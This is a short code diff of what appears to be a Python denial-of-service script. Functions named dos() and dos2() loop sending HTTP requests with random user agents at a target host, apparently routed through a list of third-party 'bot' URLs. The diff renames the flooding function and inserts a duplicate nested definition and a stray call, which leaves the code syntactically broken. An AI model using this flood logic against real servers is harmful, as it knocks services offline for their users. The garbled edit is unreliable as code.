@@ -35,6 +35,11 @@ def my_bots():
 
 
 def bot_Base_nai(url):
+def bot_Base_nai():
+    print("Base_nai")
+
+bot_Base_nai()
+    
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent)}))
@@ -75,7 +80,7 @@ def dos():
 def dos2():
     while True:
         item = w.get()
-        bot_hammering(random.choice(bots) + "http://" + host)
+        bot_Base_nai(random.choice(bots) + "http://" + host)
         w.task_done()
 
 
